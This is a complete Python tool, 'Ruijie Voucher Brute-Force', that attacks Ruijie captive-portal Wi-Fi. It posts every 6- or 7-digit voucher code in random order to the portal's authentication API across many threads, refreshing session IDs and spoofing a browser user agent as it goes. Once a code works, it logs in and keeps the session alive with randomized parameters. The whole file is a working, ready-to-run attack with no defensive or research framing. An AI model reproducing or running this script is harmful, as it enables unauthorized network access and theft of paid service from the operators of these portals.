#!/usr/bin/env python3
"""
Ruijie Voucher Brute-Force v1
Random order, multi-threaded, with live progress.
"""
import sys, threading, time, urllib.parse, queue, random, os
import requests, urllib3
urllib3.disable_warnings()

FOUND = threading.Event()
FOUND_CODE = None
FOUND_LOGON_URL = None
TRIED = 0
TOTAL = 0
LOCK = threading.Lock()

def check_online():
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
        return r.status_code == 204
    except: return False

def fmt_eta(rem, rate):
    if rate <= 0: return "?m"
    s = rem / rate
    h, r = divmod(int(s), 3600)
    m, s = divmod(r, 60)
    return f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"

def progress_printer(total, stop):
    global TRIED
    last = 0
    while not stop.is_set() and not FOUND.is_set():
        time.sleep(5)
        with LOCK: tried = TRIED
        rate = (tried - last) / 5
        rem = total - tried
        eta = fmt_eta(rem, rate) if rate > 0 else "?m"
        print(f"  {tried}/{total} ({tried*100/total:.1f}%) | {rate:.0f}/s | ETA: {eta}")
        last = tried

def worker(code_queue, sid_data, params, refresh_every, delay):
    global TRIED, FOUND_CODE, FOUND_LOGON_URL
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    local_count = 0

    while not FOUND.is_set():
        try:
            code = code_queue.get_nowait()
        except queue.Empty:
            break

        with LOCK:
            sid = sid_data["sid"]
            host = sid_data["host"]
        api_url = f"{host}/api/auth/voucher/?lang=en_US"

        try:
            r = sess.post(api_url, json={
                "accessCode": code, "sessionId": sid, "apiVersion": 1
            }, timeout=5)
            j = r.json()
            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                FOUND_CODE = code
                FOUND_LOGON_URL = j["result"]["logonUrl"]
                FOUND.set()
                break
        except: pass

        with LOCK: TRIED += 1

        local_count += 1
        if local_count >= refresh_every:
            try:
                rs = requests.Session()
                r = rs.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
                ns = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
                if ns:
                    with LOCK: sid_data["sid"] = ns
                rs.close()
            except: pass
            local_count = 0

        if delay:
            time.sleep(delay / 1000)

    sess.close()

def keepalive(sid_data, gw_addr, gw_port):
    """Keep session alive after finding code"""
    sess = requests.Session()
    while True:
        with LOCK:
            sid = sid_data["sid"]
        try:
            sess.post(
                f"http://{gw_addr}:{gw_port}/wifidog/auth",
                params={"token": sid, "phoneNumber": ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))},
                headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
                timeout=3,
            )
        except: pass
        time.sleep(0.1)

def main():
    global TOTAL
    import argparse
    parser = argparse.ArgumentParser(description="Ruijie Voucher Brute-Force")
    parser.add_argument("--type", type=int, default=1, choices=[1, 2], help="1=6-digit, 2=7-digit")
    parser.add_argument("--start", type=int, help="Range start")
    parser.add_argument("--end", type=int, help="Range end")
    parser.add_argument("--threads", type=int, default=30, help="Worker threads")
    parser.add_argument("--delay", type=float, default=0, help="Delay per attempt (ms)")
    parser.add_argument("--wordlist", type=str, help="File with codes to try")
    parser.add_argument("--refresh-every", type=int, default=500, help="Refresh session every N attempts")
    parser.add_argument("--online", action="store_true", help="Go online when code found")
    parser.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility")
    args = parser.parse_args()

    # Load codes
    if args.wordlist:
        with open(args.wordlist) as f:
            codes_raw = [l.strip() for l in f if l.strip()]
        codes = codes_raw[:]
        print(f"Loaded {len(codes)} codes from {args.wordlist}")
    else:
        if args.type == 1:
            lo = args.start or 0
            hi = args.end or 999999
        else:
            lo = args.start or 0
            hi = args.end or 9999999
        z = len(str(hi))
        codes = [str(i).zfill(z) for i in range(lo, hi + 1)]
        print(f"Range: {str(lo).zfill(z)}-{str(hi).zfill(z)} ({len(codes)} codes)")

    TOTAL = len(codes)
    if args.seed is not None:
        random.seed(args.seed)
    random.shuffle(codes)

    # Put in queue
    code_queue = queue.Queue()
    for c in codes:
        code_queue.put(c)

    # Detect captive portal
    if check_online():
        print("[!] Already online - must be on captive portal network")
        return

    sess = requests.Session()
    sess.verify = False
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
    parsed = urllib.parse.urlparse(r.url)
    params = parsed.query
    host = f"{parsed.scheme}://{parsed.netloc}"
    qp = urllib.parse.parse_qs(params)

    r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
    sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
    if not sid:
        print("[!] No sessionId from portal")
        return

    gw_addr = qp.get("gw_address", ["192.168.10.1"])[0]
    gw_port = qp.get("gw_port", ["2060"])[0]

    print(f"Host: {host}  GW: {gw_addr}:{gw_port}")
    print(f"Session: {sid[:16]}...  Threads: {args.threads}")
    print(f"Starting brute force... (Ctrl+C to stop)\n")

    sid_data = {"sid": sid, "host": host}

    stop_prog = threading.Event()
    threading.Thread(target=progress_printer, args=(TOTAL, stop_prog), daemon=True).start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(code_queue, sid_data, params, args.refresh_every, args.delay), daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[Stopped]")

    stop_prog.set()

    if FOUND_CODE:
        print(f"\n=== VALID CODE: {FOUND_CODE} ===")
        if args.online and FOUND_LOGON_URL:
            print(f"logonUrl: {FOUND_LOGON_URL}")
            r = sess.get(FOUND_LOGON_URL, timeout=5, allow_redirects=False)
            print(f"Gateway response: {r.status_code}")
            time.sleep(2)
            if check_online():
                print("*** ONLINE ***")
                threading.Thread(target=keepalive, args=(sid_data, gw_addr, gw_port), daemon=True).start()
                print("Keepalive running. Ctrl+C to stop.")
                try:
                    while True: time.sleep(10)
                except KeyboardInterrupt:
                    print("\nDone")
            else:
                # Follow the redirect from logonUrl
                loc = r.headers.get("Location", "")
                if loc:
                    print(f"Redirect: {loc[:60]}...")
                    r2 = sess.get(loc, timeout=5)
                    time.sleep(2)
                    if check_online():
                        print("*** ONLINE ***")
    else:
        print("No valid code found")

if __name__ == "__main__":
    main()
